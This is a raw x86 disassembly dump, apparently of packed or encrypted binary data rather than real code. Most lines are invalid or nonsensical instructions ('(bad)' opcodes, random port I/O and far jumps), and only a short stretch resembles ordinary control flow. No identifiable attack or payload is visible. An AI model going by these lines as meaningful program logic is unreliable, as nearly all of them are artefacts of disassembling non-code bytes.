  42acfe:	xlat   BYTE PTR ds:[ebx]
  42acff:	ror    dh,0xda
  42ad02:	add    eax,0xbef1c9eb
  42ad07:	mov    al,0xad
  42ad09:	mov    esp,0xd3e0acc2
  42ad0e:	mov    dh,0xd6
  42ad10:	rcl    ebx,1
  42ad12:	fxch   st(7)
  42ad14:	(bad)  
  42ad16:	rcr    ch,1
  42ad18:	aad    0xc4
  42ad1a:	push   es
  42ad1b:	mov    esp,0xcbe1f5f7
  42ad20:	or     al,0xed
  42ad22:	(bad)  
  42ad23:	icebp  
  42ad24:	jmp    0xadc7:0xadacd2ef
  42ad2b:	in     al,0xd9
  42ad2d:	fbstp  TBYTE PTR [ebp+ebp*8-0x17423b34]
  42ad34:	iret   
  42ad35:	aad    0x1
  42ad37:	idiv   cl
  42ad39:	stc    
  42ad3a:	mov    ebp,0xf7f5c9e9
  42ad3f:	aam    0xf8
  42ad41:	out    0xf,al
  42ad43:	jmp    0xee396b3a
  42ad48:	(bad)
  42ad4b:	loope  0x42ad28
  42ad4d:	fidivr DWORD PTR [ebx-0xc282838]
  42ad53:	iret   
  42ad54:	not    ah
  42ad56:	into   
  42ad57:	(bad)  
  42ad58:	in     eax,0x6
  42ad5a:	lock fadd DWORD PTR [ebx]
  42ad5d:	fcmovne st,st(3)
  42ad5f:	mov    BYTE PTR [edi],0x5
  42ad62:	(bad)  
  42ad63:	in     eax,dx
  42ad64:	shr    DWORD PTR [edi-0x354c2141],cl
  42ad6a:	ret    0xb0c5
  42ad6d:	out    0xe5,eax
  42ad6f:	sti    
  42ad70:	in     eax,dx
  42ad71:	fistp  QWORD PTR [edx-0x2bfe2b02]
  42ad77:	add    ah,cl
  42ad79:	(bad)  
  42ad7a:	mov    ecx,0xdcd9d9e7
  42ad7f:	or     ebp,esp
  42ad81:	in     al,0xda
  42ad83:	(bad)  
  42ad84:	(bad)
  42ad87:	mov    dl,0xaf
  42ad89:	fucomi st,st(4)
  42ad8b:	(bad)  
  42ad8c:	int    0xd9
  42ad8e:	leave  
  42ad8f:	enter  0xf7d5,0xcf
  42ad93:	(bad)  
  42ad95:	rcl    dl,0x0
  42ad98:	repz stc 
  42ad9a:	(bad)  
  42ad9c:	in     al,0xea
  42ad9e:	add    BYTE PTR [ebx],al
  42ada0:	or     ebp,ebx
  42ada2:	(bad)  
  42ada4:	ret    0xd2ad
  42ada7:	(bad)  
  42ada8:	aad    0xc4
  42adaa:	iret   
  42adab:	loope  0x42ad79
  42adad:	int3   
  42adae:	cli    
  42adaf:	imul   edi
  42adb1:	(bad)  
  42adb3:	repz add DWORD PTR [ebx],eax
  42adb6:	aam    0xc0
  42adb8:	ret    
  42adb9:	add    ecx,esi
  42adbb:	add    BYTE PTR [edx],al
  42adbd:	(bad)  
  42adbe:	call   0xd2fab9c
  42adc3:	in     al,dx
  42adc4:	(bad)
  42adc7:	shl    DWORD PTR [edx-0x30353635],1
  42adcd:	enter  0xd8d4,0xd5
  42add1:	fdivr  st(5),st
  42add3:	xlat   BYTE PTR ds:[ebx]
  42add4:	int    0xc0
  42add6:	test   bh,0x1
  42add9:	add    eax,0xfec0c7d5
  42adde:	out    dx,al
  42addf:	fcomp  st(6)
  42ade1:	push   es
  42ade2:	std    
  42ade3:	cld    
  42ade4:	out    0xad,al
  42ade6:	jmp    0xf8319ddb
  42adeb:	sti    
  42adec:	out    0xd3,al
  42adee:	into   
  42adef:	shl    ah,cl
  42adf1:	(bad)  
  42adf3:	ret    0xbfdf
  42adf6:	rol    dh,cl
  42adf8:	rcr    edx,0xc6
  42adfb:	or     edx,esp
  42adfd:	jmp    0x42add8
  42adff:	(bad)  
  42ae01:	jecxz  0x42ae00
  42ae03:	shl    dh,cl
  42ae05:	vcmpsd xmm6,xmm6,xmm3,0xb6
  42ae0a:	lock loopne 0x42add9
  42ae0d:	mov    al,0xf9
  42ae0f:	shl    ah,cl
  42ae11:	int    0xf2
  42ae13:	mov    ebx,0xbfd6d3be
  42ae18:	clc    
  42ae19:	loop   0x42ae18
  42ae1b:	jmp    0x42ae28
  42ae1d:	clc    
  42ae1e:	(bad)
  42ae21:	(bad)  
  42ae23:	or     eax,0xf6c7b8d1
  42ae28:	mov    dl,0xe2
  42ae2a:	into   
  42ae2b:	(bad)  
  42ae2c:	shr    edx,cl
  42ae2e:	fucomi st,st(5)
  42ae30:	in     al,0xdf
  42ae32:	mov    ch,0xe2
  42ae34:	shl    esp,1
  42ae36:	push   es
  42ae37:	repz mov edi,0xf8d7b9e1
  42ae3d:	std    
  42ae3e:	retf   0xcdcb
  42ae41:	jmp    0xde28a648
  42ae46:	test   al,0xdd
  42ae48:	(bad)  
  42ae49:	mov    al,0xca
  42ae4b:	repz fsubr st,st(0)
  42ae4e:	jmp    0x42ae26
  42ae50:	fdivr  st,st(7)
  42ae52:	loop   0x42ae31
  42ae54:	icebp  
  42ae55:	int    0xb8
  42ae57:	loop   0x42ae57
  42ae59:	mov    esi,0xefd4d2e5
  42ae5e:	aad    0xdd
  42ae60:	fld    QWORD PTR [edi]
  42ae62:	fild   DWORD PTR [esi]
  42ae64:	rcr    edi,1
  42ae66:	test   eax,0xceb5acc6
  42ae6b:	repz shr cl,cl
  42ae6e:	jmp    0xf4be:0xdff4f5ce
  42ae75:	fcompp 
  42ae77:	shl    eax,cl
  42ae79:	loopne 0x42ae7e
  42ae7b:	sti    
  42ae7c:	(bad)  
  42ae7d:	out    dx,eax
  42ae7e:	(bad)  
  42ae80:	enter  0xc904,0xf3
  42ae84:	loopne 0x42ae44
  42ae86:	repnz rol ebx,1
  42ae89:	mov    al,0xb5
  42ae8b:	fcmovu st,st(1)
  42ae8d:	scas   al,BYTE PTR es:[edi]
  42ae8e:	repz icebp 
  42ae90:	call   0xcd369787
  42ae95:	mov    esp,0xe606d7f7
  42ae9a:	push   es
  42ae9b:	std    
  42ae9c:	fcmovnbe st,st(7)
  42ae9e:	or     ebx,ebp
  42aea0:	add    al,dl
  42aea2:	in     al,dx
  42aea3:	retf   0xd2d9
  42aea6:	(bad)  
  42aea7:	lock cmc 
  42aea9:	(bad)  
  42aeaa:	cmc    
  42aeab:	cli    
  42aeac:	mov    cl,0xf2
  42aeae:	(bad)  
  42aeb0:	(bad)  
  42aeb2:	mov    ebx,0xfcd0d6f1
  42aeb7:	in     eax,0xdd
  42aeb9:	add    DWORD PTR [edx],ecx
  42aebb:	(bad)  
  42aebc:	shr    bl,1
  42aebe:	in     al,0x8
  42aec0:	pandn  mm2,mm3
  42aec3:	or     ebp,esp
  42aec5:	fsubr  DWORD PTR [esi-0x3e0c4d38]
  42aecb:	leave  
  42aecc:	(bad)  
  42aece:	sti    
  42aecf:	fxch   st(1)
  42aed1:	jecxz  0x42ae90
  42aed3:	icebp  
  42aed4:	enter  0x7c8,0xfc
  42aed8:	push   esi
  42aeda:	ret    
  42aedb:	(bad)  
  42aedc:	or     ecx,edi
  42aede:	push   es
  42aedf:	(bad)  
  42aee1:	add    BYTE PTR [eax],cl
  42aee3:	adc    al,ah
  42aee5:	fucomip st,st(7)
  42aee7:	shl    BYTE PTR [eax-0x4384e2f],cl
  42aeed:	in     eax,0xe5
  42aeef:	out    dx,al
  42aef0:	int    0xb2
  42aef2:	fistp  QWORD PTR [eax-0xe33401d]
  42aef8:	loop   0x42aed3
  42aefa:	clc    
  42aefb:	mov    eax,0xf9c109c3
  42af00:	or     eax,0xaefdcf04
  42af05:	mov    ebp,0xacd6cbdd
  42af0a:	leave  
  42af0b:	mov    al,0xf8
  42af0d:	retf   0xbbc5
  42af10:	fucomi st,st(5)
  42af12:	mov    edi,0xd9e2d2fa
  42af17:	loop   0x42af0e
  42af19:	fiadd  DWORD PTR [eax]
  42af1b:	(bad)  
  42af1d:	in     eax,0xc5
  42af1f:	or     eax,0x12da05c4
  42af24:	out    0xd7,al
  42af26:	mov    al,0xd3
  42af28:	retf   
  42af29:	repnz aam 0xda
  42af2c:	sar    edi,1
  42af2e:	int    0xb6
  42af30:	mov    edi,0xbef6f3b4
  42af35:	loopne 0x42af29
  42af37:	cli    
  42af38:	rol    BYTE PTR ds:0xf6f4dbe4,1
  42af3e:	add    eax,0xaf3e304
  42af43:	fsub   st(1),st
  42af45:	mov    ebp,0xf3cae7b0
  42af4a:	into   
  42af4b:	into   
  42af4c:	cmc    
  42af4d:	mov    ecx,0xfae5e5cb
  42af52:	rol    bl,1
  42af54:	mov    edi,0xbc05dcd6
  42af59:	fcmovu st,st(7)
  42af5b:	ret    0xd6f5
  42af5e:	ror    DWORD PTR [eax],0xe3
  42af61:	cld    
  42af62:	stc    
  42af63:	push   cs
  42af64:	repnz scas eax,DWORD PTR es:[edi]
  42af66:	in     al,0xf3
  42af68:	mov    dl,0xcd
  42af6a:	jmp    0xcd1d9d42
  42af6f:	div    edi
  42af71:	mov    ebp,0xf0d1cabc
  42af76:	aad    0xf4
  42af78:	fxam   
  42af7a:	jmp    0xc5d8:0xf9f90807
  42af81:	(bad)  
  42af83:	adc    edx,edx
  42af85:	retf   
  42af86:	leave  
  42af87:	(bad)  
  42af88:	stos   DWORD PTR es:[edi],eax
  42af89:	mov    ah,0xfb
  42af8b:	call   0xca327b47
  42af90:	in     al,dx
  42af91:	(bad)  
  42af92:	fcomip st,st(5)
  42af94:	iret   
  42af95:	loop   0x42af8c
  42af97:	mov    esi,0x4ebdde6
  42af9c:	(bad)  
  42af9e:	or     ch,al
  42afa0:	jmp    0x42af8a
  42afa2:	clc    
  42afa3:	loop   0x42af6e
  42afa5:	(bad)  
  42afa7:	in     al,0xc4
  42afa9:	mov    dh,0xf3
  42afab:	sar    DWORD PTR [ecx-0xd050914],cl
  42afb1:	fdiv   QWORD PTR [ebp-0x33433e50]
  42afb7:	aam    0xf5
  42afb9:	(bad)  
  42afbb:	(bad)  
  42afbc:	(bad)  
  42afbd:	cli    
  42afbe:	retf   0xc9
  42afc1:	in     al,dx
  42afc2:	add    al,0xe4
  42afc4:	(bad)  
  42afc6:	div    ebp
  42afc8:	out    dx,eax
  42afc9:	int    0xb7
  42afcb:	leave  
  42afcc:	lock out dx,al
  42afce:	(bad)  
  42afd0:	rcl    edi,cl
  42afd2:	rcr    esp,1
  42afd4:	repz mov dh,0xd5
  42afd7:	idiv   DWORD PTR [esi-0x2329243f]
  42afdd:	mov    esi,0xdf0ef4dc
  42afe2:	repz add al,0xdc
  42afe5:	shl    dh,0xc8
  42afe8:	lock out dx,al
  42afea:	jmp    0xbdfa:0xe5f9f7d6
  42aff1:	(bad)  
  42aff2:	int3   
  42aff3:	idiv   BYTE PTR [esi-0x382e2f28]
  42aff9:	xlat   BYTE PTR ds:[ebx]
  42affa:	xlat   BYTE PTR ds:[ebx]
  42affb:	cli    
  42affc:	(bad)  
  42affe:	add    ebx,esi
  42b000:	or     eax,0xe6cdecf3
  42b005:	call   0xe2fa97d5
  42b00a:	int    0xbb
  42b00c:	(bad)  
  42b00d:	(bad)  
  42b00e:	mov    ebx,0xffb4ebe5
  42b013:	hlt    
  42b014:	cld    
  42b015:	mov    edx,0xdde2f7e3
  42b01a:	jmp    0xeb06:0xdb04fbf6
  42b021:	or     al,0xe0
  42b023:	in     eax,dx
  42b024:	lods   al,BYTE PTR ds:[esi]
  42b025:	shr    DWORD PTR [ecx-0x281b1b4d],1
  42b02b:	mov    dl,0xcd
  42b02d:	(bad)  
  42b02e:	mov    DWORD PTR [ebp-0x144],eax
  42b034:	jmp    0x426553
  42b039:	jmp    0x4240dc
  42b03e:	jmp    0x418bbb
  42b043:	mov    eax,DWORD PTR [ebp+0x8]
  42b046:	xor    eax,0x75108b5
  42b04b:	jmp    0x42d3f1
  42b050:	cmp    ebx,edx
  42b052:	inc    ecx
  42b053:	inc    edx
  42b054:	push   ecx
  42b055:	push   eax
  42b056:	cmp    al,dl
  42b058:	xchg   DWORD PTR [eax+0x76],ebx
  42b05b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b05c:	data16 or BYTE PTR [ecx+0x77],dl
  42b060:	adc    ecx,0x98027b79
  42b066:	jnp    0x42b0e3
  42b068:	mov    ecx,0xd8f5d6cd
  42b06d:	fcos   
  42b06f:	add    ecx,ebx
  42b071:	ffreep st(1)
  42b073:	add    bh,dh
  42b075:	cmc    
  42b076:	push   es
  42b077:	(bad)  
  42b078:	stc    
  42b079:	add    eax,0xdd0ae0e0
  42b07e:	call   0xf7f99868
  42b083:	int    0xb0
  42b085:	lock icebp 
  42b087:	vpslld xmm1,xmm6,xmm4
  42b08b:	shl    dh,cl
  42b08d:	aad    0xf1
  42b08f:	cld    
  42b090:	mov    ecx,0xd3f4d0d5
  42b095:	sti    
  42b096:	push   es
  42b097:	or     dh,ah
  42b099:	out    dx,eax
  42b09a:	add    eax,0xe8cadef9
  42b09f:	jmp    0xf3cc:0xcae9f6ac
  42b0a6:	retf   
  42b0a7:	repnz mov edx,0xbbbfb7d9
  42b0ad:	(bad)  
  42b0af:	aam    0xf8
  42b0b1:	stc    
  42b0b2:	in     al,dx
  42b0b3:	add    bl,bl
  42b0b5:	fdiv   st(3),st
  42b0b7:	out    dx,eax
  42b0b8:	fsubr  st,st(6)
  42b0ba:	leave  
  42b0bb:	retf   0xc40a
  42b0be:	repz (bad) 
  42b0c0:	iret   
  42b0c1:	lock mov ch,0xc0
  42b0c4:	iret   
  42b0c5:	int3   
  42b0c6:	icebp  
  42b0c7:	retf   
  42b0c8:	fcomp  st(3)
  42b0ca:	mov    bh,0xcd
  42b0cc:	into   
  42b0cd:	mov    esp,0xe1c1c1c1
  42b0d2:	int    0xe3
  42b0d4:	jmp    0x42b0a6
  42b0d6:	jmp    eax
  42b0d8:	aad    0xef
  42b0da:	ret    
  42b0db:	fsub   st,st(3)
  42b0dd:	shl    BYTE PTR [ecx-0x301f5238],cl
  42b0e3:	mov    dh,0xcf
  42b0e5:	int3   
  42b0e6:	aad    0xf7
  42b0e8:	jmp    0x42b0dd
  42b0ea:	clc    
  42b0eb:	stc    
  42b0ec:	mov    ch,0xba
  42b0ee:	clc    
  42b0ef:	mov    esi,0xdcccbfcd
  42b0f4:	cmc    
  42b0f5:	(bad)  
  42b0f6:	hlt    
  42b0f7:	leave  
  42b0f8:	add    bl,al
  42b0fa:	out    0xc9,eax
  42b0fc:	out    dx,eax
  42b0fd:	out    0xbf,al
  42b0ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b100:	mov    cl,0xef
  42b102:	stos   DWORD PTR es:[edi],eax
  42b103:	rol    bh,cl
  42b105:	test   esp,0xeae4d6e0
  42b10b:	in     eax,dx
  42b10c:	(bad)  
  42b10e:	loopne 0x42b0d8
  42b110:	mov    ecx,0xfcf607e0
  42b115:	loope  0x42b108
  42b117:	jecxz  0x42b0ef
  42b119:	add    esp,ecx
  42b11b:	fsubr  st,st(6)
  42b11d:	les    esi,FWORD PTR [ecx-0x361a4e4f]
  42b123:	mov    cl,0xcc
  42b125:	loope  0x42b0ff
  42b127:	cli    
  42b128:	out    dx,eax
  42b129:	sar    BYTE PTR [ecx-0xc364503],1
  42b12f:	hlt    
  42b130:	test   ebp,0xf1dde5d5
  42b136:	loop   0x42b0fe
  42b138:	out    0x9,eax
  42b13a:	ret    
  42b13b:	or     al,0xe5
  42b13d:	int3   
  42b13e:	test   al,0xc6
  42b140:	ror    edi,0xb2
  42b143:	int    0xd6
  42b145:	test   al,0xe4
  42b147:	xlat   BYTE PTR ds:[ebx]
  42b148:	hlt    
  42b149:	fdivp  st(7),st
  42b14b:	mov    ch,0xe8
  42b14d:	mov    ecx,0xf3e3e0cd
  42b152:	cmc    
  42b153:	add    cl,ah
  42b155:	rcl    esi,0xe8
  42b158:	pop    es
  42b159:	aad    0xd8
  42b15b:	clc    
  42b15c:	fcmove st,st(1)
  42b15e:	jecxz  0x42b124
  42b160:	(bad)  
  42b161:	fmul   st(6),st
  42b163:	iret   
  42b164:	mov    ebx,0xd6d8c8ba
  42b169:	retf   0xcbbe
  42b16c:	mov    ebx,0xdfd6cfb9
  42b171:	fild   WORD PTR [ecx]
  42b173:	aad    0x7
  42b175:	in     eax,0xdb
  42b177:	jecxz  0x42b17d
  42b179:	jmp    0x42b145
  42b17b:	int3   
  42b17c:	sti    
  42b17d:	fnstcw WORD PTR [ecx-0x353d2d19]
  42b183:	mov    dh,0xe1
  42b185:	cli    
  42b186:	shr    ecx,0xb9
  42b189:	mov    edi,0xb0ceeaeb
  42b18e:	xlat   BYTE PTR ds:[ebx]
  42b18f:	enter  0xd7db,0x5
  42b193:	loope  0x42b168
  42b195:	fisttp DWORD PTR [edx]
  42b197:	clc    
  42b198:	xlat   BYTE PTR ds:[ebx]
  42b199:	hlt    
  42b19a:	(bad)  
  42b19b:	fiadd  WORD PTR [edx]
  42b19d:	stc    
  42b19e:	shl    DWORD PTR [eax-0x1e532331],1
  42b1a4:	imul   edi
  42b1a6:	out    0xcc,al
  42b1a8:	in     eax,0xf6
  42b1aa:	std    
  42b1ab:	iret   
  42b1ac:	jmp    0x42b185
  42b1ae:	into   
  42b1af:	fcmovnu st,st(4)
  42b1b1:	repz ret 0xc3c2
  42b1b5:	fsubr  st,st(1)
  42b1b7:	pop    es
  42b1b8:	fiadd  DWORD PTR [esp+eax*1]
  42b1bb:	out    dx,eax
  42b1bc:	in     al,0xf1
  42b1be:	mov    esi,0xf1f3bfe0
  42b1c3:	int3   
  42b1c4:	cmc    
  42b1c5:	int3   
  42b1c6:	jmp    0x42b19a
  42b1c8:	mov    ebx,0xccf8cbdd
  42b1cd:	mov    esp,0xf0ddb6f4
  42b1d2:	sti    
  42b1d3:	ret    
  42b1d4:	mov    ebp,0xd7c6bfd8
  42b1d9:	push   es
  42b1da:	(bad)  
  42b1db:	int    0xce
  42b1dd:	add    BYTE PTR [edi-0x2b0c531b],ch
  42b1e3:	lock jecxz 0x42b198
  42b1e6:	leave  
  42b1e7:	clc    
  42b1e8:	mov    ebx,0xd6f6deb5
  42b1ed:	repz add bh,BYTE PTR [esi-0x141fd0d]
  42b1f4:	add    eax,0xe3d6f7cb
  42b1f9:	cld    
  42b1fa:	push   es
  42b1fb:	add    ebx,ecx
  42b1fd:	dec    bl
  42b1ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b200:	repz mov ebp,0xe9fabcd0
  42b206:	mov    dl,0xb5
  42b208:	clc    
  42b209:	std    
  42b20a:	repnz sti 
  42b20c:	mov    ebx,0xf7c2c3ca
  42b211:	call   ebx
  42b213:	mov    esp,0xc2e205ea
  42b218:	jmp    0x42b1f5
  42b21a:	aam    0x9
  42b21c:	jmp    0xb1c8:0xeed2b8ce
  42b223:	mov    dl,0xd7
  42b225:	(bad)  
  42b226:	out    0xc6,al
  42b228:	mov    ebx,0xbee8b7f3
  42b22d:	stc    
  42b22e:	int    0xc3
  42b230:	into   
  42b231:	mov    esi,0xdbc3e4e5
  42b236:	fsubrp st(7),st
  42b238:	(bad)  
  42b239:	hlt    
  42b23a:	(bad)  
  42b23c:	into   
  42b23d:	retf   0xb1ef
  42b240:	out    dx,al
  42b241:	int    0xb1
  42b243:	call   0xc7358210
  42b248:	out    dx,al
  42b249:	leave  
  42b24a:	retf   0xe8b4
  42b24d:	into   
  42b24e:	sar    ah,cl
  42b250:	(bad)  
  42b251:	loop   0x42b20e
  42b253:	in     eax,0xd2
  42b255:	icebp  
  42b256:	rol    dh,1
  42b258:	ror    BYTE PTR [ebx],0xd9
  42b25b:	into   
  42b25c:	or     esi,ebx
  42b25e:	test   al,0xe6
  42b260:	ret    0xe7cd
  42b263:	mov    ch,0xf2
  42b265:	div    BYTE PTR [ebx+ebp*8-0x42222517]
  42b26c:	leave  
  42b26d:	out    dx,eax
  42b26e:	loopne 0x42b271
  42b270:	repz push es
  42b272:	push   es
  42b273:	mov    edx,0xdbf8e6e3
  42b278:	xlat   BYTE PTR ds:[ebx]
  42b279:	(bad)  
  42b27b:	out    0xfe,al
  42b27d:	fld    st(3)
  42b27f:	mov    cl,0xf2
  42b281:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b282:	mov    ch,0xd5
  42b284:	jmp    0x42b26e
  42b286:	retf   
  42b287:	repnz cmc 
  42b289:	sti    
  42b28a:	jmp    0x42b288
  42b28c:	ret    
  42b28d:	mov    eax,0xf6bcd000
  42b292:	mov    ebx,0xcbc5f1c1
  42b297:	loopne 0x42b288
  42b299:	leave  
  42b29a:	retf   
  42b29b:	clc    
  42b29c:	or     eax,0xadd1c811
  42b2a1:	mov    bh,0xd6
  42b2a3:	in     al,dx
  42b2a4:	jmp    0xf4f5:0xc4f3eacd
  42b2ab:	fdivp  st(1),st
  42b2ad:	std    
  42b2ae:	std    
  42b2af:	(bad)  
  42b2b0:	mov    eax,0xeadcd403
  42b2b5:	clc    
  42b2b6:	loop   0x42b2b0
  42b2b8:	fucom  st(7)
  42b2ba:	fsin   
  42b2bc:	rcl    DWORD PTR [ebx],cl
  42b2be:	(bad)  
  42b2bf:	out    0xf6,eax
  42b2c1:	mov    dl,0xe3
  42b2c3:	shl    BYTE PTR [ebp+eiz*8-0x1108440f],0xcb
  42b2cb:	fdivr  st(7),st
  42b2cd:	mov    edi,0xdedceef1
  42b2d2:	mov    esi,0xfa0be7e2
  42b2d7:	add    al,bl
  42b2d9:	push   cs
  42b2da:	jecxz  0x42b2de
  42b2dc:	cld    
  42b2dd:	loope  0x42b29f
  42b2df:	jecxz  0x42b28e
  42b2e1:	jmp    0xeb3aa4b0
  42b2e6:	jmp    0x42b2a2
  42b2e8:	fistp  QWORD PTR [edx-0x80c073b]
  42b2ee:	cld    
  42b2ef:	hlt    
  42b2f0:	ret    
  42b2f1:	add    esi,edi
  42b2f3:	(bad)  
  42b2f4:	lock rol esi,0x2
  42b2f8:	call   0xe8108f04
  42b2fd:	fadd   st,st(6)
  42b2ff:	rol    dh,cl
  42b301:	imul   cl
  42b303:	jecxz  0x42b2b9
  42b305:	int    0xf9
  42b307:	call   0xfe3ca3e7
  42b30c:	fpatan 
  42b30e:	in     al,dx
  42b30f:	into   
  42b310:	mov    esp,0xfed9fe07
  42b315:	add    al,0xc5
  42b317:	stc    
  42b318:	test   DWORD PTR [ebx],0x3f80ec8
  42b31e:	ret    
  42b31f:	repnz loope 0x42b308
  42b322:	xlat   BYTE PTR ds:[ebx]
  42b323:	fucomi st,st(0)
  42b325:	out    dx,al
  42b326:	(bad)  
  42b328:	fdiv   st,st(3)
  42b32a:	(bad)  
  42b32c:	mov    esp,0xdcbcdfe8
  42b331:	icebp  
  42b332:	icebp  
  42b333:	add    DWORD PTR [ecx],eax
  42b335:	aam    0x5
  42b337:	or     bh,dl
  42b339:	fsubrp st(4),st
  42b33b:	fmul   st,st(1)
  42b33d:	dec    bl
  42b33f:	retf   0xd3e8
  42b342:	stos   DWORD PTR es:[edi],eax
  42b343:	lods   eax,DWORD PTR ds:[esi]
  42b344:	test   eax,0xf1bbc0e4
  42b349:	hlt    
  42b34a:	cli    
  42b34b:	cli    
  42b34c:	sar    DWORD PTR [eax-0x190c2441],cl
  42b352:	push   es
  42b353:	cli    
  42b354:	aad    0xda
  42b356:	stc    
  42b357:	sti    
  42b358:	faddp  st(5),st
  42b35a:	fcomp  st(4)
  42b35c:	or     al,0x13
  42b35e:	mov    eax,0xe7e0d0e9
  42b363:	mov    ah,0xf1
  42b366:	out    0xcb,al
  42b368:	int3   
  42b369:	shl    bh,1
  42b36b:	neg    al
  42b36d:	lock xlat BYTE PTR ds:[ebx]
  42b36f:	loope  0x42b32d
  42b371:	mov    esp,0xe9cbe6d5
  42b376:	aam    0xe6
  42b378:	pop    es
  42b379:	(bad)
  42b37c:	rol    DWORD PTR [edx],cl
  42b37e:	out    dx,eax
  42b37f:	(bad)  
  42b380:	out    0xd7,al
  42b382:	shl    ebp,1
  42b384:	in     eax,0xb4
  42b386:	jmp    0xfbd4:0xe8b9d3c7
  42b38d:	shr    cl,1
  42b38f:	enter  0xddd7,0xbd
  42b393:	or     esp,ecx
  42b395:	loope  0x42b393
  42b397:	(bad)  
  42b398:	fiadd  WORD PTR [esi]
  42b39a:	in     eax,0xc8
  42b39c:	shr    edi,0xf3
  42b39f:	lods   eax,DWORD PTR ds:[esi]
  42b3a0:	call   0xf10f7f8d
  42b3a5:	icebp  
  42b3a6:	shr    eax,cl
  42b3a8:	mov    dh,0xcf
  42b3aa:	imul   ecx
  42b3ac:	mov    esp,0xd8f5ffbc
  42b3b1:	fstp   st(5)
  42b3b3:	mov    esi,0xe0e0cb00
  42b3b8:	inc    DWORD PTR ds:0xeee2db0c
  42b3be:	test   eax,0xb2d7bca9
  42b3c3:	loop   0x42b3a7
  42b3c5:	mov    ch,0xc1
  42b3c7:	jmp    0x42b3a4
  42b3c9:	repnz enter 0xf603,0xe3
  42b3ce:	(bad)  
  42b3cf:	out    dx,eax
  42b3d0:	shl    BYTE PTR [edi+edi*4-0x3cf53b28],0xff
  42b3d8:	add    cl,BYTE PTR [edx]
  42b3da:	out    0xf,eax
  42b3dc:	jecxz  0x42b3c5
  42b3de:	retf   0xc7ac
  42b3e1:	mov    dl,0xec
  42b3e3:	icebp  
  42b3e4:	ror    esi,1
  42b3e6:	in     al,0xd3
  42b3e8:	into   
  42b3e9:	out    0xfe,al
  42b3eb:	jmp    0xb93bacdd
  42b3f0:	idiv   ebp
  42b3f2:	icebp  
  42b3f3:	aam    0xdd
  42b3f5:	test   DWORD PTR [edx],0x803c6e0
  42b3fb:	add    al,0xf3
  42b3fd:	fisubr DWORD PTR [esi-0x15144350]
  42b403:	jmp    0xb8c4:0xd8c8f1b2
  42b40a:	mov    dh,0xdc
  42b40c:	ret    
  42b40d:	fidivr DWORD PTR [ebx-0x3a0ffd2f]
  42b413:	add    al,0x6
  42b415:	(bad)
  42b418:	in     al,0xff
  42b41a:	iret   
  42b41b:	fdivr  st,st(4)
  42b41d:	loopne 0x42b408
  42b41f:	shl    dl,0xdc
  42b422:	mov    dl,0xe2
  42b424:	xlat   BYTE PTR ds:[ebx]
  42b425:	enter  0xcee7,0xe7
  42b429:	int3   
  42b42a:	mov    esi,0xdcecfede
  42b42f:	(bad)  
  42b431:	hlt    
  42b432:	hlt    
  42b433:	or     edx,eax
  42b435:	add    DWORD PTR [ebx],ecx
  42b437:	loope  0x42b437
  42b439:	(bad)  
  42b43a:	out    0xcd,al
  42b43c:	in     eax,0x1
  42b43e:	icebp  
  42b43f:	in     eax,dx
  42b440:	mov    dl,0xb1
  42b442:	in     al,dx
  42b443:	out    0xe2,eax
  42b445:	out    0xed,al
  42b447:	(bad)  
  42b449:	clc    
  42b44a:	fdivp  st(7),st
  42b44c:	out    dx,al
  42b44d:	call   0xe82ab324
  42b452:	loope  0x42b45f
  42b454:	retf   
  42b455:	cli    
  42b456:	add    ah,bl
  42b458:	(bad)  
  42b459:	stc    
  42b45a:	std    
  42b45b:	retf   
  42b45c:	push   es
  42b45d:	push   cs
  42b45e:	out    dx,al
  42b45f:	rcr    bh,cl
  42b461:	rcl    edi,1
  42b463:	mov    bh,0xc2
  42b465:	cmc    
  42b466:	call   0xfdef7019
  42b46b:	stc    
  42b46c:	xlat   BYTE PTR ds:[ebx]
  42b46d:	aam    0xee
  42b46f:	clc    
  42b470:	mov    ebp,0xdcbabbd4
  42b475:	jecxz  0x42b453
  42b477:	lock jmp ecx
  42b47a:	iret   
  42b47b:	ret    0xdee9
  42b47e:	mov    edi,0xcabcd3ee
  42b483:	(bad)  
  42b484:	iret   
  42b485:	loope  0x42b454
  42b487:	stc    
  42b488:	mov    eax,0xe8cee4e5
  42b48d:	(bad)  
  42b48f:	(bad)  
  42b490:	stc    
  42b491:	sar    dh,0x0
  42b494:	test   DWORD PTR [ecx],0xdfd8fc0b
  42b49a:	add    eax,0xc8cbe7cb
  42b49f:	rol    ah,cl
  42b4a1:	loop   0x42b463
  42b4a3:	jmp    0x42b49f
  42b4a5:	shl    cl,0xda
  42b4a8:	(bad)  
  42b4aa:	fdivr  st(1),st
  42b4ac:	repz icebp 
  42b4ae:	repnz mov ebp,0xc1bddbf6
  42b4b4:	add    edi,ecx
  42b4b6:	add    eax,edi
  42b4b8:	jecxz  0x42b49d
  42b4ba:	loop   0x42b4bd
  42b4bc:	out    dx,al
  42b4bd:	retf   0xc5f1
  42b4c0:	mov    edi,0xb2cfe3f6
  42b4c5:	div    edx
  42b4c7:	ror    al,1
  42b4c9:	fnstenv [esi-0x210d2002]
  42b4cf:	(bad)  
  42b4d1:	out    0xed,al
  42b4d3:	rcl    eax,0xfa
  42b4d6:	or     dh,dh
  42b4d8:	or     ebx,ecx
  42b4da:	in     eax,dx
  42b4db:	out    0xef,al
  42b4dd:	call   0xe9f2748a
  42b4e2:	scas   al,BYTE PTR es:[edi]
  42b4e3:	mov    dh,0xe1
  42b4e5:	(bad)
  42b4e8:	in     al,0xd8
  42b4ea:	sti    
  42b4eb:	(bad)  
  42b4ed:	fucomi st,st(1)
  42b4ef:	(bad)  
  42b4f0:	sar    ecx,cl
  42b4f2:	(bad)  
  42b4f3:	stc    
  42b4f4:	cmc    
  42b4f5:	retf   0xfde7
  42b4f8:	add    dl,bh
  42b4fa:	hlt    
  42b4fb:	loop   0x42b504
  42b4fd:	add    ch,dl
  42b4ff:	mov    ebp,0xc1d4a8c1
  42b504:	out    dx,eax
  42b505:	mov    bl,0xcb
  42b507:	int3   
  42b508:	in     al,dx
  42b509:	xlat   BYTE PTR ds:[ebx]
  42b50a:	cld    
  42b50b:	rcr    bh,1
  42b50d:	aam    0x1
  42b50f:	loop   0x42b4d8
  42b511:	aad    0xc3
  42b513:	mov    esp,0xf4c701f3
  42b518:	cli    
  42b519:	dec    DWORD PTR ds:0xe2c4c9ec
  42b51f:	call   0xbcf47c01
  42b524:	(bad)  
